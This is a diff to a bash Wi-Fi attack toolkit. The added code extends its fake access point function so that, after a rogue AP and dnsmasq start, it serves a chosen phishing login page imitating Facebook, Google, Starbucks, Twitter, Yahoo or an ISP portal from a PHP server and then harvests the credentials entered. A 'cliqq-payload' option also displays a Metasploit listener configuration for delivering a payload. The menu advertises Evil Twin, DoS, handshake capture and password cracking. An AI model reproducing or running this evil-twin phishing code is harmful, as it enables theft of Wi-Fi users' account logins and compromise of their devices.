@@ -652,7 +652,52 @@ fakeap() {
 	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
 	sleep 3
 	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
-	echo -ne "Enter to exit " && read 
+	cd src
+	if [ "$(echo $?)" -ne 0 ]; then
+		cd $pathmain
+		cd src
+	fi
+	logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi)
+	tput cnorm
+	echo -ne "\n${redColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo, cliqq-payload, optimumwifi): " && read usedlogin
+	check_logins=0; for login in "${logins[@]}"; do
+		if [ "$login" == "$usedlogin" ]; then
+				check_logins=1
+		fi
+		
+		done
+			
+		if [ "$usedlogin" == "cliqq-payload" ]; then
+			check_logins=2
+		fi
+			
+		if [ $check_logins -eq 1 ]; then
+			tput civis; pushd $usedlogin > /dev/null 2>&1
+			echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
+			php -S 192.168.1.1:80 > /dev/null 2>&1 &
+			sleep 2
+			popd > /dev/null 2>&1; credentials
+		elif [ $check_logins -eq 2 ]; then
+			tput civis; pushd $usedlogin > /dev/null 2>&1
+			echo -e "\n${yellowColour}[*]${grayColour} Starting server PHP..."
+			php -S 192.168.1.1:80 > /dev/null 2>&1 &
+			sleep 2
+			echo -e "\n${yellowColour}[*]${grayColour} Configure from another console a Listener in Metasploit as follows: "
+			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+			cat msfconsole.rc
+			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+			echo -e "\n${redColour}[!]${grayColour} Enter to continue${endColour}" && read
+			popd > /dev/null 2>&1; credentials
+		else
+			tput civis; echo -e "\n${yellowColour}[*]${grayColour} Using custom template..."; sleep 1
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $usedlogin\n"; sleep 1
+			pushd $usedlogin > /dev/null 2>&1
+			php -S 192.168.1.1:80 > /dev/null 2>&1 
+			popd > /dev/null 2>&1; credentials
+		fi
+
+	cd $pathmain
+	
 }
 caphccapx() {
 	clear; tput civis; echo -e "$blueColour[*]$grayColour Starting .cap -> .hccapx converter"; sleep 2
@@ -717,8 +762,8 @@ banner() {
 bannermainattack() {
 	bannerattack
 	echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Fake Access Point\t\t${turquoiseColour}[+]${grayColour} Cracking password"
-	echo -e "${yellowColour}\n[1] Handshake Attack\t\t[7] Wifiphisher\t\t\t[9] Force Brute .cap"
-	echo -e "[2] PMKID Attack\t\t[8] Fake AP\t\t[10] Hash .cap -> .hccapx"
+	echo -e "${yellowColour}\n[1] Handshake Attack\t\t[7] Wifiphisher/Evil Twin\t\t\t[9] Force Brute .cap"
+	echo -e "[2] PMKID Attack\t\t[8] Fake/Rogue AP\t\t[10] Hash .cap -> .hccapx"
 	echo -e "[3] DoS Attack\t\t\t\t\t\t\t[11] Hashed Dictionary (Rainbow tables)"
 	echo -e "[4] Beacon Flood Attack\t\t\t\t\t\t[12] Force Brute with GPU"
 	echo -e "[5] Network traffic"
